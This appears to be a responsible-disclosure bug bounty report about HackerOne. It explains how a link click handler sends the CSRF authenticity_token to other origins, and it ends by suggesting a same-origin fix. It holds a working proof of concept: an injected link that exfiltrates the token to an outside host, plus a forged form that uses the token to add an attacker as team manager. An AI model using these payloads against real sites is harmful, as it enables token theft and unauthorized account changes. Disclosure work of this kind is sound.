  "vulnerability_information": "**Background**\r\n\r\n- There has been [at least one case](/reports/46072) where [an attacker](/danlec) was able to insert arbitrary HTML into a submitted report\r\n- HackerOne uses a very strict Content Security Policy that prevents inline script and script from other origins\r\n- HackerOne uses an `authenticity_token` in its POSTs to guard against CSRF attacks\r\n- There is a click handler for links with a`data-method` attribute that makes it so an `<a>` tag with a `data-method=\"post\"` will send the CSRF token in a POST to the `href` of the link, **even if the target is a different origin**\r\n\r\n**Proof of concept**\r\n\r\n1.  Suppose that someone is able to find an exploit similar to #46072, allowing them to insert arbitrary HTML into a report, and they insert the following payload:\r\n```\r\n<a href=\"http://danlec.com\" data-method=\"post\">Proof of Concept</a>\r\n```\r\n  Since I'm not currently aware of a means of doing this, we'll have to simulate this by running the following from the console:\r\n```\r\n$(\".hacktivity-container-content:first\")\r\n .html('<p><a href=\"http://danlec.com\" data-method=\"post\">Click Me!</a></p>')\r\n```\r\n  (Yes, in general security reports involving the victim running code on the console are highly suspect.  Please bear with me.)\r\n\r\n2.  When the victim clicks the link, the current `authenticity_token` is sent to <http://danlec.com>.  You can inspect the headers that are sent, or have the link be <http://httpbin.org/post> which will echo the headers that it was sent.\r\n\r\n3.  Using the `authenticity_token` it was provided, the target of the link could automatically submit a form like the following on the victim's behalf:\r\n```\r\n<form method=\"POST\" action=\"https://hackerone.com/danlec-test/team_members\"\r\n     target=\"_blank\">\r\n  <input type=\"text\" name=\"authenticity_token\" \r\n     value=\"authenticity_token from the POST to this page\">\r\n  <input type=\"text\" name=\"invitations_team_member[email]\" \r\n     value=\"attacker@gmail.com\">\r\n  <input type=\"hidden\" name=\"team_member[add_as_manager]\" value=\"1\">\r\n  <input type=\"hidden\" name=\"utf8\" value=\"âœ“\">\r\n  <input type=\"hidden\" name=\"commit\" value=\"Send invite\">\r\n  <input type=\"submit\">\r\n</form>\r\n```\r\n\r\nIt would make sense if the click handler for links with a `data-method` attribute only ran for links to URLs with the same origin, especially in situations warranting a strict Content Security Policy.\r\n\r\n",
